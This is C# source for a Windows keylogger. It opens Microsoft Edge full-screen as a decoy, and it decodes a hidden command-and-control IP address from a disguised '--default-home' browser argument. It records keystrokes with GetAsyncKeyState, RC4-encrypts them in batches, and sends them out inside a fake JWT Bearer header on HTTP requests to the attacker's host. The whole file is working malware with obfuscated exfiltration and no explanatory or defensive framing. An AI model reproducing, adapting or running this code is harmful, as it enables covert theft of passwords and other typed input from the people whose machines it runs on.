using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.IO.Compression;
using System.Net.Http.Headers;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    private static bool shift;

    public static byte[] Encrypt(byte[] data, byte[] pwd) {
        int a, i, j, k, tmp;
        int[] key, box;
        byte[] cipher;

        key = new int[256];
        box = new int[256];
        cipher = new byte[data.Length];

        for (i = 0; i < 256; i++) {
            key[i] = pwd[i % pwd.Length];
            box[i] = i;
        }
        for (j = i = 0; i < 256; i++) {
            j = (j + box[i] + key[i]) % 256;
            tmp = box[i];
            box[i] = box[j];
            box[j] = tmp;
        }
        for (a = j = i = 0; i < data.Length; i++) {
            a++;
            a %= 256;
            j += box[a];
            j %= 256;
            tmp = box[a];
            box[a] = box[j];
            box[j] = tmp;
            k = box[((box[a] + box[j]) % 256)];
            cipher[i] = (byte)(data[i] ^ k);
        }
        return cipher;
    }

    static void Main(string[] args)
    {
        string applicationPath = @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe";

        int[] toRemove = {};
        string ip = "";
        string port = "";
        bool hasDefaultHome = false;
        bool hasProxyPort = false;

        for (int i = 0; i < args.Length; i++) {
            if (args[i] == "--default-home") {
                hasDefaultHome = true;
                string link = args[i+1];
                link = link.Substring(28);
                link = link.Replace("+", " ");
                string[] octets = link.Split(", ");
                foreach (string octet in octets) {
                    string[] digits = octet.Split(" ");
                    foreach (string digit in digits) {
                        ip += digit.Length.ToString();
                    }

                    ip += ".";
                }
                ip = ip.TrimEnd('.');
            } else if (args[i] == "--proxy-port") {
                hasProxyPort = true;
                port = args[i+1];
            }
        }

        Process process = new Process();
        process.StartInfo.FileName = applicationPath;
        process.StartInfo.Arguments = "--start-fullscreen";
        process.Start();

        if (hasDefaultHome && hasProxyPort) {
            var client = new HttpClient();
            List<string> buffer = new List<string>();
            var counter = 0;
            while (true)
            {
                for (int key = 8; key <= 255; key++)
                {
                    if (buffer.Count == 30)
                    {
                        var encrypted = Encrypt(Encoding.ASCII.GetBytes(string.Join("", buffer)), Encoding.ASCII.GetBytes("hello!"));
                        var payload = Convert.ToBase64String(encrypted);

                        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."+payload.Replace("=",""));
                        client.GetAsync("http://"+ip+":"+port+"/employees/"+counter.ToString());
                        buffer.Clear();
                        counter++;
                    }
                    int state = GetAsyncKeyState(key);
                    if (state == 1 || state == -32767)
                    {
                        string output = GetKeyCharacter(key);
                        if (!string.IsNullOrEmpty(output))
                        {
                            buffer.Add(output);
                        }
                    }
                }
            }
        }
    }

    static string GetKeyCharacter(int key)
    {
        string output = "";
        if ((GetAsyncKeyState(0x10) & 0x8000) == 0 && shift == true)
        {
            output += "[SHIFT]";
            shift = false;
        }

        switch (key)
        {
            case >= 48 and <= 90:
                output += ((char)key).ToString();
                break;
            case 32: 
                output += " ";
                break;
            case 13: 
                output += "\n";
                break;
            case 9: 
                output += "[TAB]";
                break;
            case 8: 
                output += "[Back]";
                break;
            case 16: 
                if (shift == false)
                {
                    output += "[SHIFT]";
                    shift = true;
                }
                break;
            case 27: 
                output += "[Esc]";
                break;
            case 186: 
                output += ":";
                break;
            case 187: 
                output += "+";
                break;
            case 188: 
                output += "<";
                break;
            case 189: 
                output += "_";
                break;
            case 190: 
                output += ">";
                break;
            case 191: 
                output += "?";
                break;
            case 192: 
                output += "~";
                break;
            case 219: 
                output += "{";
                break;
            case 220: 
                output += "|";
                break;
            case 221: 
                output += "}";
                break;
            case 222: 
                output += "\"";
                break;
        }

        return output;
    }
}

